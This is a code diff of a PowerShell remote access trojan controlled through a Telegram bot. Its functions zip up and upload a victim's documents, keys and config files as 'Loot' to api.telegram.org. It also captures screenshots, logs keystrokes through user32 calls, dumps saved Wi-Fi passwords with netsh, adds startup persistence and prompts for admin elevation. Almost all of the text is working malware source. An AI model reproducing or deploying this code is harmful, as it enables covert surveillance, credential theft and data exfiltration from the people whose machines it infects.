@@ -23,35 +23,24 @@ $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
 
 # Startup Delay
-if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
-Sleep 15
-}
-
+if(Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){Sleep 15}
+Sleep 2
 # remove pause files
-if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){
-rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force
-}
-if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){
-rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force
-}
-
+if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
+if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
 # Get Chat ID from the bot
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
 $MessageToSend = New-Object psobject 
 $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
-
 # Collect script contents
 $scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
-
 #----------------------------------------------- ON START ------------------------------------------------------
-
 # Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-
 #----------------------------------------------- ACTION FUNCTIONS -------------------------------------------------
 
 Function Options{
@@ -61,8 +50,8 @@ $contents = "==============================================
 ============= $cmde Commands List $cmde ============
 ==============================================
 
-ExtraInfo    : Extra commands information
 Close   : Close this Session
+ExtraInfo    : Extra commands information
 PauseSession   : Kills this session and restarts
 ToggleErrors    : Toggle error messages to chat
 FolderTree    : Gets Dir tree and sends it zipped
@@ -78,11 +67,9 @@ IsAdmin   : Checks if session has admin Privileges
 AttemptElevate  : Send user a prompt to gain Admin
 
 =============================================="
-
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
-
 
 Function ExtraInfo{
 $contents = "==============================================
@@ -118,11 +105,9 @@ To set URL from here type `$GHurl = 'YOUR_TEXTFILE_URL'
 into the chat (before invoking the function!)
 
 =============================================="
-
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
-
 
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
@@ -138,26 +123,16 @@ $maxZipFileSize = 50MB
 $currentZipSize = 0
 $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
-$contents = "$env:COMPUTERNAME $tick Exfiltration Started"
+$contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
-
-If($Path -ne $null){
-    $foldersToSearch = "$env:USERPROFILE\"+$Path
-}else{
-    $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
-}
-
-If($FileType -ne $null){
-    $fileExtensions = "*."+$FileType
-}else {
-    $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.docx", "*.rft")
-}
-
+If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
+else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}
+If($FileType -ne $null){$fileExtensions = "*."+$FileType}
+else {$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.docx", "*.rft")}
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
 $escmsg = "Files from : "+$env:COMPUTERNAME
-
 foreach ($folder in $foldersToSearch) {
     foreach ($extension in $fileExtensions) {
         $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
@@ -189,12 +164,13 @@ foreach ($folder in $foldersToSearch) {
 $zipArchive.Dispose()
 curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"  | Out-Null
 rm -Path $zipFilePath -Force
-Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
+$contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
 }
 
 
 Function Screenshot{
-
 Add-Type -AssemblyName System.Windows.Forms
 $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
 $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
@@ -204,14 +180,12 @@ $filePath = "$env:temp\sc.png"
 $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 $graphics.Dispose()
 $bitmap.Dispose()
-
 curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
 Remove-Item -Path $filePath
-
 }
 
 Function KeyCapture {
-$contents = "$env:COMPUTERNAME $tick KeyCapture Started.."
+$contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
@@ -292,7 +266,6 @@ $Geolocate.Position.Location | Select Latitude,Longitude
 $outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
 if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
-
 $outpath = "$env:temp\SystemInfo.txt"
 "USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII
 "Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -395,7 +368,6 @@ $inlineKeyboardJson = @"
     ]
 }
 "@
-
 $paramers = @{
     chat_id = $chatId
     text = $messagehead
@@ -438,7 +410,6 @@ rm -Path $zipFilePath -Force
 Write-Output "Done."
 }
 
-
 Function AddPersistance{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
@@ -459,7 +430,6 @@ $tobat | Out-File -FilePath $pth -Force
 Write-Output "Persistance Added."
 rm -path "$env:TEMP\temp.ps1" -Force
 }
-
 
 Function RemovePersistance{
 rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
